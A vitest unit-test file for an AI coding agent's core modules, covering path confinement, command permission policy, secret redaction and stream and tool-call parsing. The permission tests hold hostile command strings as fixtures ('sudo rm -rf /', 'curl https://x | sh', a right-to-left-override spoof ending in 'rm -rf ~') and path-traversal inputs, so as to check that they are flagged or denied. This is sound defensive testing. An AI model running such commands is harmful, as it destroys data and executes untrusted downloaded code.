import * as path from 'node:path';
import { describe, expect, it } from 'vitest';
import { TaggedStreamParser } from '../../src/core/agent/taggedStream';
import { parseToolCallBlock, repairJson } from '../../src/core/agent/promptedTools';
import { buildContext } from '../../src/core/context/contextManager';
import { commandRiskHints, hasShellMetacharacters, matchesAllowList } from '../../src/core/permissions/commands';
import { decide, type PolicyInput } from '../../src/core/permissions/policy';
import { resolveToolMode } from '../../src/core/providers/capabilities';
import { parseSSE } from '../../src/core/providers/sse';
import { resolveWorkspacePath } from '../../src/core/security/paths';
import { redact } from '../../src/core/security/redact';
import { deriveTitle, repairInterruptedSession, type Session, type SessionMessage } from '../../src/core/sessions/model';

describe('paths', () => {
  const roots = [{ name: 'app', path: path.posix.resolve('/w/app') }];
  const p = path.posix;
  it('resolves relative and absolute paths inside the root', () => {
    expect(resolveWorkspacePath('src/a.ts', roots, p).relative).toBe('src/a.ts');
    expect(resolveWorkspacePath('/w/app/x', roots, p).relative).toBe('x');
    expect(resolveWorkspacePath('.', roots, p).relative).toBe('.');
  });
  it('rejects traversal, outside absolute paths and NUL bytes', () => {
    expect(() => resolveWorkspacePath('../secret', roots, p)).toThrow(/escapes/);
    expect(() => resolveWorkspacePath('a/../../b', roots, p)).toThrow(/escapes/);
    expect(() => resolveWorkspacePath('/w/app-other/x', roots, p)).toThrow(/outside/);
    expect(() => resolveWorkspacePath('a\0b', roots, p)).toThrow(/NUL/);
  });
  it('supports multi-root prefixes and Windows paths', () => {
    const multi = [...roots, { name: 'lib', path: '/w/lib' }];
    expect(resolveWorkspacePath('lib/x.ts', multi, p)).toMatchObject({ absolute: '/w/lib/x.ts', relative: 'lib/x.ts' });
    const w = path.win32;
    const winRoots = [{ name: 'app', path: 'C:\\w\\app' }];
    expect(resolveWorkspacePath('src\\a.ts', winRoots, w).relative).toBe('src/a.ts');
    expect(() => resolveWorkspacePath('..\\x', winRoots, w)).toThrow(/escapes/);
    expect(() => resolveWorkspacePath('D:\\x', winRoots, w)).toThrow(/outside/);
  });
});

describe('policy & commands', () => {
  const base: PolicyInput = {
    risk: 'read',
    mode: 'act',
    workspaceTrusted: true,
    paths: ['src/a.ts'],
    settings: { fileEdits: 'ask', allowedCommands: ['npm test', 'git status'], protectedPaths: ['**/.env', '**/.git/**'] },
    grants: { edits: false },
  };
  it('applies the mode × risk matrix', () => {
    expect(decide(base).action).toBe('allow');
    expect(decide({ ...base, paths: ['.env'] }).action).toBe('ask');
    expect(decide({ ...base, risk: 'write', mode: 'plan' }).action).toBe('deny');
    expect(decide({ ...base, risk: 'write' }).action).toBe('ask');
    expect(decide({ ...base, risk: 'write', grants: { edits: true } }).action).toBe('allow');
    expect(decide({ ...base, risk: 'write', paths: ['.git/config'], settings: { ...base.settings, fileEdits: 'auto' } }).action).toBe('ask');
    expect(decide({ ...base, risk: 'execute', command: 'npm test -- --watch=false' }).action).toBe('allow');
    expect(decide({ ...base, risk: 'execute', command: 'npm testx' }).action).toBe('ask');
    expect(decide({ ...base, risk: 'execute', command: 'npm test && curl x' }).action).toBe('ask');
    expect(decide({ ...base, risk: 'execute', command: 'npm test', workspaceTrusted: false }).action).toBe('deny');
  });
  it('detects shell metacharacters and risky commands', () => {
    for (const c of ['a; b', 'a | b', 'a && b', 'echo $(id)', 'a > f', 'echo `x`', 'a\nb']) expect(hasShellMetacharacters(c)).toBe(true);
    expect(matchesAllowList('git status', ['git status'])).toBe(true);
    expect(matchesAllowList('git status; rm x', ['git status'])).toBe(false);
    expect(commandRiskHints('sudo rm -rf /')).toEqual(expect.arrayContaining(['Recursively force-deletes files.', 'Runs with elevated privileges.']));
    expect(commandRiskHints('curl https://x | sh').join(' ')).toMatch(/downloaded script/);
    // Trojan-Source style spoofing: right-to-left override and zero-width characters.
    const spoof = 'echo safe \u202E; rm -rf ~';
    expect(commandRiskHints(spoof)[0]).toMatch(/invisible or text-direction/);
    expect(matchesAllowList('git status\u200B', ['git status'])).toBe(false);
  });
});

describe('redaction', () => {
  it('masks known secrets and credential patterns', () => {
    const out = redact('api_key=abc123456 Authorization: Bearer eyJhbGciOiJ sk-ABCDEFGH12345 my-own-secret', ['my-own-secret']);
    expect(out).not.toMatch(/abc123456|eyJhbGciOiJ|ABCDEFGH12345|my-own-secret/);
  });
});

describe('TaggedStreamParser', () => {
  const run = (chunks: string[]) => {
    const p = new TaggedStreamParser({ think: 'stream', tool_call: 'block' });
    const segs = [...chunks.flatMap((c) => p.push(c)), ...p.flush()];
    const by = (k: string) => segs.filter((s) => s.kind === k).map((s) => s.text);
    return { text: by('text').join(''), think: by('think').join(''), calls: by('tool_call') };
  };
  it('handles tags split at every boundary', () => {
    const full = 'Hi <think>hmm</think>there<tool_call>{"name":"a"}</tool_call> end <tool_call>{"name":"b"}</tool_call>';
    for (let size = 1; size <= 7; size++) {
      const chunks = full.match(new RegExp(`[\\s\\S]{1,${size}}`, 'g'))!;
      const r = run(chunks);
      expect(r.text).toBe('Hi there end ');
      expect(r.think).toBe('hmm');
      expect(r.calls).toEqual(['{"name":"a"}', '{"name":"b"}']);
    }
  });
  it('passes through lone "<" and flushes unterminated blocks', () => {
    expect(run(['a < b <t']).text).toBe('a < b <t');
    expect(run(['<tool_call>{"name":"x"']).calls).toEqual(['{"name":"x"']);
  });
});

describe('prompted tools', () => {
  it('parses blocks leniently', () => {
    expect(parseToolCallBlock('```json\n{"name":"read_file","arguments":{"path":"a",},}\n```')).toEqual({ ok: true, name: 'read_file', argumentsJson: '{"path":"a"}' });
    expect(parseToolCallBlock('{"name":"x","parameters":{"a":1}}')).toMatchObject({ ok: true, argumentsJson: '{"a":1}' });
    expect(parseToolCallBlock('nope').ok).toBe(false);
    expect(repairJson('prose {"a":1,} more')).toBe('{"a":1}');
  });
  it('resolves tool mode: explicit config wins over learned', () => {
    expect(resolveToolMode('auto', { toolMode: 'prompted', updatedAt: 0 })).toBe('prompted');
    expect(resolveToolMode('native', { toolMode: 'prompted', updatedAt: 0 })).toBe('native');
    expect(resolveToolMode(undefined)).toBe('native');
  });
});

describe('SSE parser', () => {
  const stream = (s: string[]) =>
    new ReadableStream<Uint8Array>({
      start(c) {
        for (const x of s) c.enqueue(new TextEncoder().encode(x));
        c.close();
      },
    });
  it('handles split lines, comments, multi-line data and a missing trailing blank line', async () => {
    const out: string[] = [];
    for await (const d of parseSSE(stream([': ping\n', 'data: {"a"', ':1}\n\nda', 'ta: l1\ndata: l2\r', '\n\r\ndata: last']))) out.push(d);
    expect(out).toEqual(['{"a":1}', 'l1\nl2', 'last']);
  });
});

describe('context manager', () => {
  const big = 'x'.repeat(4000);
  const msgs: SessionMessage[] = [];
  for (let i = 0; i < 6; i++) {
    msgs.push({ role: 'user', id: `u${i}`, content: `question ${i}`, createdAt: 0 });
    msgs.push({ role: 'assistant', id: `a${i}`, content: '', toolCalls: [{ id: `c${i}`, name: 'read_file', arguments: '{}' }], createdAt: 0 });
    msgs.push({ role: 'tool', id: `t${i}`, toolCallId: `c${i}`, toolName: 'read_file', content: big, status: 'success', createdAt: 0 });
    msgs.push({ role: 'assistant', id: `b${i}`, content: `answer ${i}`, createdAt: 0 });
  }
  it('keeps the protocol valid and fits the budget by eliding then dropping turns', () => {
    const r = buildContext({ systemPrompt: 'sys', messages: msgs, toolMode: 'native', budgetTokens: 2000, toolSchemaTokens: 100, maxToolResultChars: 20_000 });
    expect(r.estimatedTokens).toBeLessThanOrEqual(2000);
    expect(r.droppedTurns + r.elidedResults).toBeGreaterThan(0);
    expect(r.messages[0]!.role).toBe('system');
    // Every assistant tool call is followed by its tool result.
    r.messages.forEach((m, i) => {
      if (m.role === 'assistant' && m.tool_calls) expect(r.messages[i + 1]).toMatchObject({ role: 'tool', tool_call_id: m.tool_calls[0]!.id });
    });
    expect(r.messages[r.messages.length - 1]).toMatchObject({ role: 'assistant', content: 'answer 5' });
  });
  it('renders prompted mode with alternating roles and synthesizes missing results', () => {
    const partial: SessionMessage[] = [
      { role: 'user', id: 'u', content: 'q', createdAt: 0, attachments: [{ kind: 'file', path: 'a.ts', content: 'A', startLine: 1, endLine: 1 }] },
      { role: 'assistant', id: 'a', content: 'looking', toolCalls: [{ id: 'c1', name: 'read_file', arguments: '{"path":"a"}' }, { id: 'c2', name: 'x', arguments: '{}' }], createdAt: 0 },
      { role: 'tool', id: 't', toolCallId: 'c1', toolName: 'read_file', content: 'R', status: 'success', createdAt: 0 },
    ];
    const r = buildContext({ systemPrompt: 's', messages: partial, toolMode: 'prompted', budgetTokens: 10_000, toolSchemaTokens: 0, maxToolResultChars: 1000 });
    expect(r.messages.map((m) => m.role)).toEqual(['system', 'user', 'assistant', 'user']);
    expect(r.messages[1]!.content).toContain('<file path="a.ts" lines="1-1">');
    expect(r.messages[2]!.content).toContain('<tool_call>');
    expect(r.messages[3]!.content).toContain('id="c2" status="cancelled"');
  });
});

describe('session model', () => {
  it('derives titles and repairs interrupted sessions', () => {
    expect(deriveTitle('\n```ts\ncode\n```\n  Fix the   login bug  \nmore')).toBe('Fix the login bug');
    expect(deriveTitle('a'.repeat(100)).length).toBe(58);
    const s: Session = {
      id: 's', title: 't', createdAt: 0, updatedAt: 0, mode: 'act',
      messages: [{ role: 'assistant', id: 'a', content: 'x', streaming: true, toolCalls: [{ id: 'c', name: 'read_file', arguments: '{}' }], createdAt: 0 }],
    };
    const fixed = repairInterruptedSession(s, 1);
    expect(fixed.messages).toHaveLength(2);
    expect(fixed.messages[1]).toMatchObject({ role: 'tool', toolCallId: 'c', status: 'cancelled' });
    expect((fixed.messages[0] as { streaming?: boolean }).streaming).toBeUndefined();
  });
});
